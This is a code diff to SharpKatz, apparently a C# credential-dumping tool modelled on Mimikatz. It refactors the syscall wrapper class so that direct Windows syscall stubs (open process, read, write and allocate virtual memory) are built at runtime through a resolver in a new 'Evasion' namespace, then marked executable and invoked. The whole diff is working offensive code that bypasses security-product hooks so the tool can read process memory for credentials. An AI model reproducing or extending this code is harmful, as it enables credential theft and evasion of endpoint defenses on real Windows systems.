@@ -1,4 +1,5 @@
-﻿using SharpKatz.Crypto;
+using SharpKatz.Crypto;
+using SharpKatz.Evasion;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -12,80 +13,47 @@ namespace SharpKatz.Win32
 {
     class SysCall
     {
-        const int memoryPtrotection = 0x40;
+        const int memoryProtection = 0x40; // PAGE_EXECUTE_READWRITE
 
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x0f
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
+        /// <summary>
+        /// Generic method to execute a syscall via dynamically resolved SSN.
+        /// Builds the stub at runtime, pins it, marks executable, and invokes.
+        /// </summary>
+        private static T ExecuteSyscall<T>(string ntFunction, Type delegateType, params object[] args) where T : struct
+        {
+            byte[] stub = SsnResolver.BuildSyscallStub(ntFunction);
 
-        static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
+            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x3A
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
+            try
+            {
+                if (!Natives.VirtualProtect(memoryAddress,
+                    (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
+                {
+                    throw new Win32Exception();
+                }
 
-        static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+                Delegate syscallDelegate = Marshal.GetDelegateForFunctionPointer(memoryAddress, delegateType);
+                object result = syscallDelegate.DynamicInvoke(args);
 
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x50
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x36
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bZwQuerySystemInformation10 = { 0x49, 0x89, 0xCA, 0xB8, 0x36, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        /// 0:  4c 8b d1                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x18
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bNtReadVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3f, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x3f
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bNtAllocateVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x1E
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bNtFreeVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x1E, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        /// 0:  49 89 ca                mov r10,rcx
-        /// 3:  b8 0f 00 00 00          mov eax,0x55
-        /// 8:  0f 05                   syscall
-        /// a:  c3                      ret
-
-        static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
-
-        ///0:  49 89 ca                mov r10,rcx
-        ///3:  b8 26 00 00 00          mov eax,0x26
-        ///8:  0f 05                   syscall
-        ///a:  c3                      ret
-
-        static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+                return (T)result;
+            }
+            finally
+            {
+                pinnedArray.Free();
+            }
+        }
 
         public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
         {
-            byte[] syscall = bZwOpenProcess10;
+            byte[] stub = SsnResolver.BuildSyscallStub("ZwOpenProcess");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -93,18 +61,17 @@ namespace SharpKatz.Win32
             Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));
 
             return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
-
         }
 
         public static NTSTATUS ZwClose10(IntPtr handle)
         {
-            byte[] syscall = bZwClose10;
+            byte[] stub = SsnResolver.BuildSyscallStub("ZwClose");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -112,18 +79,17 @@ namespace SharpKatz.Win32
             Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));
 
             return (NTSTATUS)myAssemblyFunction(handle);
-
         }
 
         public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)
         {
-            byte[] syscall = bZwQuerySystemInformation10;
+            byte[] stub = SsnResolver.BuildSyscallStub("ZwQuerySystemInformation");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -131,18 +97,17 @@ namespace SharpKatz.Win32
             Delegates.ZwQuerySystemInformation myAssemblyFunction = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwQuerySystemInformation));
 
             return (NTSTATUS)myAssemblyFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);
-
         }
 
         public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
         {
-            byte[] syscall = bNtReadVirtualMemory10;
+            byte[] stub = SsnResolver.BuildSyscallStub("NtReadVirtualMemory");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -150,18 +115,17 @@ namespace SharpKatz.Win32
             Delegates.NtReadVirtualMemory myAssemblyFunction = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtReadVirtualMemory));
 
             return (NTSTATUS)myAssemblyFunction(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
-
         }
 
         public static NTSTATUS NtWriteVirtualMemory10(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
         {
-            byte[] syscall = bZwWriteVirtualMemory10;
+            byte[] stub = SsnResolver.BuildSyscallStub("NtWriteVirtualMemory");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -169,18 +133,17 @@ namespace SharpKatz.Win32
             Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));
 
             return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
-
         }
 
         public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
         {
-            byte[] syscall = bNtAllocateVirtualMemory10;
+            byte[] stub = SsnResolver.BuildSyscallStub("NtAllocateVirtualMemory");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
@@ -188,27 +151,24 @@ namespace SharpKatz.Win32
             Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
 
             return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
-
         }
 
         public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)
         {
-            byte[] syscall = bNtFreeVirtualMemory10;
+            byte[] stub = SsnResolver.BuildSyscallStub("NtFreeVirtualMemory");
 
-            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            GCHandle pinnedArray = GCHandle.Alloc(stub, GCHandleType.Pinned);
             IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
 
             if (!Natives.VirtualProtect(memoryAddress,
-                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+                (UIntPtr)stub.Length, memoryProtection, out uint oldprotect))
             {
                 throw new Win32Exception();
             }
 
-
             Delegates.NtFreeVirtualMemory myAssemblyFunction = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtFreeVirtualMemory));
 
             return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ref RegionSize, FreeType);
-
         }
 
         public struct Delegates
@@ -260,7 +220,7 @@ namespace SharpKatz.Win32
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool RtlInitString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPStr)] string SourceString);
-            
+
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);
